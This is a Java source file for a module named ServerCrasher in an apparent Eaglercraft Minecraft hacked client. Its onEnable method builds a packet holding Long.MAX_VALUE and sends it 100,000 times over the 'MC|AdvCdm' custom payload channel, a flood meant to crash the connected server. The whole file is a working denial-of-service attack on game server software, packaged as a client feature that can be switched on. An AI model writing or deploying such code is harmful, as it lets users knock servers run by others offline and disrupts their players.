package proclient.module.misc;

import net.lax1dude.eaglercraft.v1_8.internal.KeyboardConstants;
import net.lax1dude.eaglercraft.v1_8.netty.Unpooled;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.C17PacketCustomPayload;
import proclient.module.Category;
import proclient.module.Module;

public class ServerCrasher extends Module {

	public ServerCrasher() {
		super("ServerCrasher", KeyboardConstants.KEY_NONE, Category.MISC);
	}

	@Override
	public void onEnable() {
		PacketBuffer packetbuffer = new PacketBuffer(Unpooled.buffer());
		packetbuffer.writeLong(Long.MAX_VALUE);
		
		for(int i = 0; i < 100000; ++i) {
			mc.getNetHandler().addToSendQueue(new C17PacketCustomPayload("MC|AdvCdm", packetbuffer));
		}
		super.onEnable();
	}
	
	@Override
	public void onDisable() {
		super.onDisable();
	}
}